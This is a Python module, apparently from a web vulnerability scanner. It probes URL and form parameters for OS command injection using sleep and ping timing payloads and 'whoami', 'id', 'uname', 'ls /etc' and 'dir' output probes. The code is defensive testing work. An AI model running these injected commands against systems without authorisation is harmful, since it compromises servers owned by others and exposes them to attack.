"""
CommandInjectionModule - OS command injection testing.

Tests discovered parameters for command injection vulnerabilities
using time-based and output-based detection techniques.
"""

import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.utils import (
    print_info,
    print_good,
    print_warning,
    print_error,
    print_vuln,
    get_session,
)
from core.config import Config
import logging


class CommandInjectionModule:

    TIME_PAYLOADS = [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("|| sleep 5", 5),
        ("&& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        ("; ping -c 5 127.0.0.1", 5),
        ("| ping -c 5 127.0.0.1", 5),
    ]

    OUTPUT_MARKERS = [
        ("whoami", re.compile(r"(?:root|www-data|apache|nginx|nobody|www|http|tomcat|administrator)")),
        ("id", re.compile(r"uid=\d+\(?\w*\)?\s+gid=\d+")),
        ("uname", re.compile(r"Linux\s+\S+\s+\d+\.\d+")),
        ("ls /etc", re.compile(r"(?:passwd|shadow|hosts|hostname)")),
        ("dir C:\\", re.compile(r"(?:Windows|Program Files|Users)", re.IGNORECASE)),
    ]

    def __init__(self, scanner):
        self.scanner = scanner
        self.config = scanner.config
        self.payloads = Config.COMMAND_INJECT

    def run(self, target: str, session=None):
        print_info(f"Running command injection tests on {target}...")
        results: Dict[str, Any] = {
            "target": target,
            "vulnerable_params": [],
            "findings": [],
        }

        params = self._extract_params(target, session)
        if not params:
            print_info("No injectable parameters found for command injection testing.")
            self.scanner.scan_data["command_injection"] = results
            return results

        print_info(f"Testing {len(params)} parameter(s) for command injection...")
        for param_info in params:
            url = param_info.get("url", target)
            param_name = param_info.get("name", "")
            method = param_info.get("method", "GET")

            if not param_name:
                continue

            vulns = self.run_on_params(target, [param_info], session)
            if vulns:
                results["vulnerable_params"].append(param_info)
                results["findings"].extend(vulns)

        self.scanner.scan_data["command_injection"] = results
        return results

    def run_on_params(self, target: str, params: List[Dict[str, Any]], session=None) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        if session is None:
            session = get_session()

        for param_info in params:
            url = param_info.get("url", target)
            param_name = param_info.get("name", "")
            method = param_info.get("method", "GET").upper()

            if not param_name:
                continue

            print_info(f"  Testing parameter '{param_name}' on {url}")
            result = self.test_command_injection(url, param_name, session, method)
            if result:
                findings.append(result)

        return findings

    def test_command_injection(self, url: str, param: str, session, method: str = "GET") -> Optional[Dict[str, Any]]:
        print_info(f"    Time-based command injection test on '{param}'...")

        for payload, delay in self.TIME_PAYLOADS:
            try:
                start = time.time()
                resp = self._make_request(url, param, payload, method, session)
                elapsed = time.time() - start

                if elapsed >= delay:
                    finding = {
                        "type": "command_injection",
                        "detection": "time_based",
                        "url": url,
                        "param": param,
                        "method": method,
                        "payload": payload,
                        "elapsed": round(elapsed, 2),
                        "expected_delay": delay,
                        "status_code": resp.status_code,
                    }
                    print_vuln(
                        f"Command injection (time-based) in '{param}' @ {url} | "
                        f"Payload: {payload} | Delay: {elapsed:.1f}s"
                    )
                    self.scanner.findings.append(
                        f"[CMDI:TIME] {url} param={param} payload='{payload}' delay={elapsed:.1f}s"
                    )
                    return finding
            except Exception:
                logging.exception("command_injection.py: exception")
                continue
        print_info(f"    Time-based test inconclusive for '{param}'. Trying output-based...")
        return self._test_output_based(url, param, session, method)

    def _test_output_based(self, url: str, param: str, session, method: str) -> Optional[Dict[str, Any]]:
        for cmd, pattern in self.OUTPUT_MARKERS:
            payload = f"; {cmd}"
            try:
                resp = self._make_request(url, param, payload, method, session)
                body = resp.text or ""

                match = pattern.search(body)
                if match:
                    finding = {
                        "type": "command_injection",
                        "detection": "output_based",
                        "url": url,
                        "param": param,
                        "method": method,
                        "payload": payload,
                        "command": cmd,
                        "evidence": match.group(0),
                        "status_code": resp.status_code,
                    }
                    print_vuln(
                        f"Command injection (output-based) in '{param}' @ {url} | "
                        f"Command: {cmd} | Evidence: {match.group(0)}"
                    )
                    self.scanner.findings.append(
                        f"[CMDI:OUTPUT] {url} param={param} cmd='{cmd}' evidence='{match.group(0)}'"
                    )
                    return finding
            except Exception:
                logging.exception("command_injection.py: exception")
                continue
        print_info(f"    No command injection found for '{param}'.")
        return None

    def _make_request(self, url: str, param: str, payload: str, method: str, session):
        timeout = self.config.timeout + 10
        if method == "GET":
            test_url = self._inject_param(url, param, payload)
            return session.get(test_url, timeout=timeout, verify=self.config.verify_tls)
        else:
            return session.post(url, data={param: payload}, timeout=timeout, verify=self.config.verify_tls)

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _extract_params(self, target: str, session=None) -> List[Dict[str, Any]]:
        params: List[Dict[str, Any]] = []

        crawl_data = self.scanner.scan_data.get("crawl", {})
        forms = crawl_data.get("forms", [])
        for form in forms:
            form_url = form.get("url", target)
            for fp in form.get("params", []):
                params.append({
                    "url": form_url,
                    "name": fp.get("name", ""),
                    "method": form.get("method", "GET"),
                })

        parsed = urlparse(target)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for key in qs:
            params.append({
                "url": target,
                "name": key,
                "method": "GET",
            })

        seen = set()
        unique_params = []
        for p in params:
            k = (p["url"], p["name"], p["method"])
            if k not in seen:
                seen.add(k)
                unique_params.append(p)

        return unique_params
